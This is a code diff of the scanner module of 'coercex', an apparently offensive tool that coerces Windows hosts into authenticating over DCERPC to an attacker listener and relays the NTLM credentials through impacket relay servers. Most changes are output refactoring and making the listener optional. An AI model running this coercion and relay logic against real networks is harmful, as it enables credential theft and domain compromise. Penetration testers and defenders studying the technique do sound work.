@@ -3,20 +3,21 @@
 Ties together the DCERPC connection pool, async listener, and method
 registry into a high-performance concurrent pipeline.
 
-Three modes:
+Four modes:
   - scan:   No listener, classify RPC error codes to detect vulnerable methods.
-  - coerce: Starts listener, triggers with real UNC paths, confirms callbacks.
-  - fuzz:   Tries multiple path styles/transports per method.
+  - coerce: Optionally starts listener, triggers with UNC paths, confirms callbacks.
+  - fuzz:   Tries multiple path styles/transports per method (listener optional).
+  - relay:  Starts impacket relay servers and triggers coercion.
 """
 
 from __future__ import annotations
 
 import asyncio
 import logging
-import sys
 from dataclasses import dataclass
 from enum import Enum, auto
-from typing import TextIO
+
+from rich.console import Console
 
 from coercex.connection import DCERPCPool, trigger_method
 from coercex.listener import AsyncListener
@@ -34,6 +35,17 @@ from coercex.utils import (
 
 log = logging.getLogger("coercex.scanner")
 
+# ── Rich status styling ─────────────────────────────────────────────
+_STATUS_STYLE = {
+    TriggerResult.VULNERABLE: ("bold green", "[+]"),
+    TriggerResult.ACCESSIBLE: ("yellow", "[~]"),
+    TriggerResult.ACCESS_DENIED: ("red", "[-]"),
+    TriggerResult.NOT_AVAILABLE: ("dim", "[ ]"),
+    TriggerResult.CONNECT_ERROR: ("bold red", "[!]"),
+    TriggerResult.TIMEOUT: ("magenta", "[T]"),
+    TriggerResult.UNKNOWN_ERROR: ("dim red", "[?]"),
+}
+
 
 class Mode(Enum):
     SCAN = auto()
@@ -50,7 +62,7 @@ class ScanConfig:
     mode: Mode = Mode.SCAN
     protocols: list[str] | None = None
     creds: Credentials | None = None
-    listener_host: str = ""  # Attacker IP for coerce/fuzz
+    listener_host: str = ""  # Attacker IP for coerce/fuzz (empty = no listener)
     http_port: int = 80
     smb_port: int = 445
     transport: Transport = Transport.SMB
@@ -71,21 +83,10 @@ class ScanConfig:
     relay_socks: bool = False
     relay_lootdir: str = ""
 
-
-def _format_result_line(result: ScanResult) -> str:
-    """Format a single result for live output."""
-    sym = {
-        TriggerResult.VULNERABLE: "[+]",
-        TriggerResult.ACCESSIBLE: "[~]",
-        TriggerResult.ACCESS_DENIED: "[-]",
-        TriggerResult.NOT_AVAILABLE: "[ ]",
-        TriggerResult.CONNECT_ERROR: "[!]",
-        TriggerResult.TIMEOUT: "[T]",
-        TriggerResult.UNKNOWN_ERROR: "[?]",
-    }
-    prefix = sym.get(result.result, "[?]")
-    cb = " (callback!)" if result.callback_received else ""
-    return f"{prefix} {result.target} | {result.protocol}::{result.method} via {result.pipe}{cb}"
+    @property
+    def has_listener(self) -> bool:
+        """Whether a listener IP was provided."""
+        return bool(self.listener_host)
 
 
 class Scanner:
@@ -96,9 +97,9 @@ class Scanner:
         stats = await scanner.run()
     """
 
-    def __init__(self, config: ScanConfig, output: TextIO = sys.stderr):
+    def __init__(self, config: ScanConfig, console: Console | None = None):
         self.config = config
-        self.output = output
+        self.console = console or Console(stderr=True)
         self.stats = ScanStats()
         self._pool: DCERPCPool | None = None
         self._listener: AsyncListener | None = None
@@ -117,17 +118,14 @@ class Scanner:
 
         self.stats.total_targets = len(self.config.targets)
 
-        self._print(
-            f"coercex | mode={self.config.mode.name.lower()} "
-            f"targets={len(self.config.targets)} methods={len(methods)} "
-            f"concurrency={self.config.concurrency}"
+        self.console.print(
+            f"[bold cyan]coercex[/] | mode=[bold]{self.config.mode.name.lower()}[/] "
+            f"targets=[bold]{len(self.config.targets)}[/] methods=[bold]{len(methods)}[/] "
+            f"concurrency=[bold]{self.config.concurrency}[/]"
         )
 
-        # Start listener for coerce/fuzz modes
-        if self.config.mode in (Mode.COERCE, Mode.FUZZ):
-            if not self.config.listener_host:
-                log.error("Listener host required for coerce/fuzz mode")
-                return self.stats
+        # Start listener for coerce/fuzz modes (only if listener_host is set)
+        if self.config.mode in (Mode.COERCE, Mode.FUZZ) and self.config.has_listener:
             self._listener = AsyncListener(
                 host="0.0.0.0",
                 http_port=self.config.http_port,
@@ -136,8 +134,9 @@ class Scanner:
                 enable_smb=self.config.transport == Transport.SMB,
             )
             await self._listener.start()
-            self._print(
-                f"Listener started (http={self.config.http_port}, smb={self.config.smb_port})"
+            self.console.print(
+                f"[green]Listener started[/] "
+                f"(http={self.config.http_port}, smb={self.config.smb_port})"
             )
 
         # Start relay servers for relay mode
@@ -166,15 +165,15 @@ class Scanner:
             )
             self._relay = RelayManager(relay_cfg)
             self._relay.start()
-            self._print(
-                f"Relay servers started -> {', '.join(self.config.relay_targets)}"
+            self.console.print(
+                f"[green]Relay servers started[/] -> "
+                f"{', '.join(self.config.relay_targets)}"
             )
 
         try:
             if self.config.mode == Mode.FUZZ:
                 await self._run_fuzz(methods)
             elif self.config.mode == Mode.RELAY:
-                # Relay mode: trigger coercion, relay servers handle the auth
                 await self._run_relay(methods)
             else:
                 await self._run_scan_or_coerce(methods)
@@ -186,12 +185,11 @@ class Scanner:
             if self._relay:
                 self._relay.stop()
 
-        self._print_summary()
         return self.stats
 
     async def _run_scan_or_coerce(self, methods: list[CoercionMethod]) -> None:
         """Dispatch all target x method x pipe combinations."""
-        tasks: list[asyncio.Task] = []
+        tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
             for method in methods:
@@ -199,12 +197,11 @@ class Scanner:
                     task = asyncio.create_task(self._attempt(target, method, binding))
                     tasks.append(task)
 
-        # Gather all tasks, allowing exceptions to be collected
         await asyncio.gather(*tasks, return_exceptions=True)
 
     async def _run_fuzz(self, methods: list[CoercionMethod]) -> None:
         """Fuzz mode: try all path styles per method."""
-        tasks: list[asyncio.Task] = []
+        tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
             for method in methods:
@@ -229,13 +226,8 @@ class Scanner:
         await asyncio.gather(*tasks, return_exceptions=True)
 
     async def _run_relay(self, methods: list[CoercionMethod]) -> None:
-        """Relay mode: trigger coercion, relay servers handle NTLM auth.
-
-        Like COERCE mode but without our simple listener — the impacket
-        relay servers capture and relay the authentication independently.
-        We just fire triggers with UNC paths pointing to our relay servers.
-        """
-        tasks: list[asyncio.Task] = []
+        """Relay mode: trigger coercion, relay servers handle NTLM auth."""
+        tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
             for method in methods:
@@ -253,12 +245,7 @@ class Scanner:
         method: CoercionMethod,
         binding: PipeBinding,
     ) -> None:
-        """Single relay trigger attempt — fire and forget.
-
-        The relay servers handle the NTLM exchange independently.
-        We just trigger the coercion and report whether the RPC call
-        succeeded (indicating the target tried to authenticate back).
-        """
+        """Single relay trigger attempt."""
         async with self._semaphore:
             transport = self.config.transport
             path_style = "share_file"
@@ -268,7 +255,6 @@ class Scanner:
                 if transport == Transport.HTTP
                 else self.config.smb_port
             )
-            # Use a random token for logging/tracking, but no listener future
             from coercex.utils import random_string
 
             token = random_string(12)
@@ -300,23 +286,26 @@ class Scanner:
             transport = transport_override or self.config.transport
             path_style = path_style_override or "share_file"
 
-            # Build the UNC path
-            if self.config.mode == Mode.SCAN:
-                # Scan mode: dummy path that won't actually call back
-                # but will trigger the RPC and produce error codes
+            # Determine if we're operating with a listener
+            use_listener = (
+                self.config.mode in (Mode.COERCE, Mode.FUZZ)
+                and self.config.has_listener
+                and self._listener is not None
+            )
+
+            if self.config.mode == Mode.SCAN or (
+                self.config.mode in (Mode.COERCE, Mode.FUZZ) and not use_listener
+            ):
+                # No listener: use dummy path, classify errors only
                 path = build_unc_path(
                     "127.0.0.1", "coercexscan", transport, path_style=path_style
                 )
                 result = await trigger_method(pool, target, method, binding, path)
             else:
-                # Coerce/fuzz: real listener path with correlation token
+                # Listener active: use real path with correlation token
                 listener = self._listener
-                if listener:
-                    token, future = listener.create_token()
-                else:
-                    # Shouldn't happen, but handle gracefully
-                    token = "notokenfallback"
-                    future = None
+                assert listener is not None
+                token, future = listener.create_token()
 
                 port = (
                     self.config.http_port
@@ -348,7 +337,6 @@ class Scanner:
                     except asyncio.TimeoutError:
                         pass
                 elif future and listener:
-                    # Clean up unused token
                     listener.cancel_token(token)
 
             self.stats.add(result)
@@ -360,102 +348,10 @@ class Scanner:
             TriggerResult.VULNERABLE,
             TriggerResult.ACCESSIBLE,
         ):
-            self._print(_format_result_line(result))
-
-    def _print(self, msg: str) -> None:
-        """Write a line to output."""
-        print(msg, file=self.output, flush=True)
-
-    def _print_summary(self) -> None:
-        """Print scan summary statistics."""
-        s = self.stats
-        self._print("")
-        self._print("=" * 60)
-        self._print(
-            f"Scan complete: {s.total_targets} targets, {s.total_attempts} attempts"
-        )
-        self._print(f"  Vulnerable:    {s.vulnerable}")
-        self._print(f"  Accessible:    {s.accessible}")
-        self._print(f"  Access Denied: {s.access_denied}")
-        self._print(f"  Not Available: {s.not_available}")
-        self._print(f"  Connect Errors:{s.connect_errors}")
-        self._print(f"  Timeouts:      {s.timeouts}")
-        self._print("=" * 60)
-
-
-def format_results_table(stats: ScanStats, show_all: bool = False) -> str:
-    """Format scan results as a table for stdout.
-
-    Args:
-        stats: Scan statistics with results.
-        show_all: If False, only show vulnerable/accessible results.
-
-    Returns:
-        Formatted table string.
-    """
-    lines: list[str] = []
-
-    results = stats.results
-    if not show_all:
-        results = [
-            r
-            for r in results
-            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
-        ]
-
-    if not results:
-        return "No vulnerable methods found."
-
-    # Header
-    header = f"{'Target':<20} {'Protocol':<10} {'Method':<45} {'Pipe':<20} {'Result':<15} {'Callback':<8}"
-    lines.append(header)
-    lines.append("-" * len(header))
-
-    for r in results:
-        cb = "YES" if r.callback_received else ""
-        lines.append(
-            f"{r.target:<20} {r.protocol:<10} {r.method:<45} {r.pipe:<20} {r.result.value:<15} {cb:<8}"
-        )
-
-    return "\n".join(lines)
-
-
-def format_results_json(stats: ScanStats, show_all: bool = False) -> str:
-    """Format scan results as JSON."""
-    import json
-
-    results = stats.results
-    if not show_all:
-        results = [
-            r
-            for r in results
-            if r.result in (TriggerResult.VULNERABLE, TriggerResult.ACCESSIBLE)
-        ]
-
-    data = {
-        "summary": {
-            "total_targets": stats.total_targets,
-            "total_attempts": stats.total_attempts,
-            "vulnerable": stats.vulnerable,
-            "accessible": stats.accessible,
-            "access_denied": stats.access_denied,
-            "not_available": stats.not_available,
-            "connect_errors": stats.connect_errors,
-            "timeouts": stats.timeouts,
-        },
-        "results": [
-            {
-                "target": r.target,
-                "protocol": r.protocol,
-                "method": r.method,
-                "pipe": r.pipe,
-                "uuid": r.uuid,
-                "result": r.result.value,
-                "callback_received": r.callback_received,
-                "source_ip": r.source_ip,
-                "error": r.error,
-            }
-            for r in results
-        ],
-    }
-    return json.dumps(data, indent=2)
+            style, sym = _STATUS_STYLE.get(result.result, ("dim red", "[?]"))
+            cb = " [bold green](callback!)[/]" if result.callback_received else ""
+            self.console.print(
+                f"[{style}]{sym}[/] {result.target} | "
+                f"[blue]{result.protocol}[/]::{result.method} "
+                f"via [dim]{result.pipe}[/]{cb}"
+            )
